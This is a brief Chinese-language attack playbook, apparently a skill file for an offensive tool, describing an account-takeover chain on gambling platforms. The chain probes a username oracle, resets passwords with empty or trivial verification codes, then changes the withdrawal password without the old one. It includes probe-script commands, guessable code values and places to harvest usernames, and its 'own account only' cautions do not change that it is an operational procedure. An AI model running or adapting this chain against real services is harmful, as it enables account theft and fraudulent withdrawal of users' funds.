# 夺舍·重置

> 杀招：`秦百胜·夺舍`（先本链，再谈验证码爆破）  
> 探针：`炼蛊房/ato_reset_withdraw_probe.py`  
> 衔接：`account-takeover-chain` · `reset-token-surface` · `fund-edge-ops`  
> **只打自己的号**。改他人密码 / 真提现 **先问**。

盘口常见：业务 API 全绑 JWT，IDOR 全阴，钱在「重置 → 设提现密 → withdraw」。  
`gambling-password-reset-ato` 旧文从验证码爆破起手是错序。

## 强制顺序

```text
有会员票 / 能注册
 → 对象矩阵
 → 登录响应差分（存在用户名 vs 幽灵用户名）= 用户名 oracle
 → POST resetPassword {userName:自己, code:任意/空, newPassword}
 → 新密码登录 = L2 ATO
 → POST updateWithdrawPassword {newPassword}（不要旧密）
 → 提现接口先看是否要 OTP；真打链上提现先问
```

用户名从哪来：自己号、推广 `start=ucode`、排行榜 `account`、客服/TG。不要对陌生人发重置邮件。

## 命令

```bash
python3 炼蛊房/ato_reset_withdraw_probe.py oracle \
  --base https://授权站 --case <案卷> --exist-user SELF --ghost-user nosuchuser999

python3 炼蛊房/ato_reset_withdraw_probe.py dummy-reset \
  --base https://授权站 --case <案卷> --token "$TOKEN" \
  --self-user SELF --new-password 'SelfOnly1!'

python3 炼蛊房/ato_reset_withdraw_probe.py withdraw-pwd \
  --base https://授权站 --case <案卷> --token "$TOKEN" --new-password 'WdSelf1!'
```

`code` 试空 / `000000` / `1` / `test`。命中后 **禁止** 默认再打 `/api/wallet/withdraw`。  
假支付仍走 `pay_matrix`；回调被 token 中间件拦住算该路阴，回本链。
